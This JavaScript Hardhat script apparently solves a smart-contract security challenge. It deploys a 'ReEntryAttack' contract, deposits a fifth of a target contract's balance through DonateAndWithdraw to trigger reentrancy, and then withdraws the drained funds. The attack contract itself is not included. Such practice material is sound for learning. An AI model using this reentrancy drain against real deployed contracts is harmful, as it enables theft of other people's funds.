const path = require('path');
const addresses = require('../Addresses.json')

async function main() {
    const scriptName = path.basename(__filename, '.js');
    console.log('----------', scriptName, '----------');

    const accounts = await ethers.getSigners();
    const sender = accounts[0];
    
    const ReEntracyAddress = addresses[scriptName];
    let balance = (await ethers.provider.getBalance(ReEntracyAddress));

    const ReEntryAttack = await ethers.getContractFactory('ReEntryAttack');
    const reEntryAttack = await ReEntryAttack.deploy();
    const contract = await reEntryAttack.deployed();

    const txAttack = await contract.DonateAndWithdraw(ReEntracyAddress, {value: balance.div(5)});

    const txGetFunds = await contract.withdraw();

    console.log('----------End----------');
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
